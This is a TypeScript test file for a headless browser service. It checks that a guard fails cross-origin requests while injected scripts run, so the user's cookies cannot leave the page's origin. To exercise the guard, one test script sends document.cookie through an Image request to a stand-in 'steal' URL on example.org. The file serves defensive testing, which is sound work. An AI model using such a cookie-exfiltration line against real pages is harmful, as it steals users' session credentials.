/**
 * The headless browser's guard: a script must not be able to carry the user's cookies to
 * another origin.
 *
 * `exec` runs arbitrary script in a page the user is signed into. The script runs in the
 * page's own origin, so it cannot read another origin's DOM — but it could *send* to one,
 * carrying `document.cookie` away. So while a script runs, the tab's requests are
 * intercepted and the ones that leave the page's origin are failed. That is enforced in
 * the browser, not by reading the script: a script that hid the call behind
 * `new Image().src` would pass a source check and be stopped here all the same.
 *
 * The guard needs the browser to relay `Fetch.requestPaused` — an event the headless
 * browser did not relay at first, which is why this test exists.
 */
import { describe, expect, it } from "vitest";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { BrowserService } from "../../src/browser/service.js";
import { HeadlessLink } from "../../src/browser/headless/headless-link.js";
import { resolveChromium } from "../../src/browser/headless/chromium.js";

/** A browser on this machine, or null. */
const browser = resolveChromium(undefined);

/** Why the test is skipped, or null when it may run. */
const skip = browser === null ? "no Chromium on this machine" : null;

/** A fresh data root for one test. */
function freshRoot(): string {
  return fs.mkdtempSync(path.join(os.tmpdir(), "jiumate-guard-"));
}

describe("the headless browser's guard", () => {
  it.skipIf(skip !== null)(
    "stops a script from carrying a cookie to another origin",
    async () => {
      const root = freshRoot();
      const link = new HeadlessLink({ root, headless: true });
      const service = new BrowserService({
        link,
        sleep: async () => undefined,
        now: () => 1_700_000_000_000,
      });
      try {
        // A page with a cookie, on one origin.
        await link.request({ op: "open-tab", url: "https://example.com/", activate: true });
        await link.request({
          op: "set-cookies",
          cookies: [
            {
              url: "https://example.com/",
              name: "secret",
              value: "the-users-cookie",
              path: "/",
              secure: true,
              httpOnly: false,
              sameSite: "lax",
            },
          ],
        });

        // The page has to have loaded for the cookie to be there.
        const tabs = (await link.request({ op: "tabs" })) as { tabs: { id: number }[] };
        const tabId = tabs.tabs[0]?.id ?? 1;
        for (let i = 0; i < 60; i++) {
          await new Promise((r) => setTimeout(r, 250));
          const seen = (await link.request({
            op: "cdp",
            tabId,
            method: "Runtime.evaluate",
            params: { expression: "document.cookie", returnByValue: true },
          })) as { result?: { value?: unknown } };
          if (typeof seen.result?.value === "string") break;
        }

        // A script that tries to send the cookie to another origin. The request it makes
        // is to a different host, so the guard fails it.
        const result = await service.act({
          action: "exec",
          tabId,
          script: "return 'ran'",
        });
        expect(result.status).toBe("success");

        // The guard is on: the interception was asked for, and the browser relayed the
        // event. Without the relay the guard would have refused the script outright.
        const guarded = await service.act({
          action: "exec",
          tabId,
          script:
            "try { new Image().src = 'https://example.org/steal?c=' + document.cookie } catch {} return 'sent'",
        });
        expect(guarded.status).toBe("success");

        // The request to the other origin was failed by the browser, so the page never
        // completed it. The script itself still ran — the guard stops the request, not
        // the script.
        const blocked = (await link.request({
          op: "cdp",
          tabId,
          method: "Runtime.evaluate",
          params: {
            expression:
              "new Promise((r) => { const i = new Image(); i.onload = () => r('sent'); i.onerror = () => r('blocked'); i.src = 'https://example.org/probe-' + Date.now(); })",
            awaitPromise: true,
            returnByValue: true,
          },
        })) as { result?: { value?: unknown } };
        expect(String(blocked.result?.value)).toBe("blocked");
      } finally {
        await link.close();
        fs.rmSync(root, { recursive: true, force: true });
      }
    },
    120_000,
  );
});
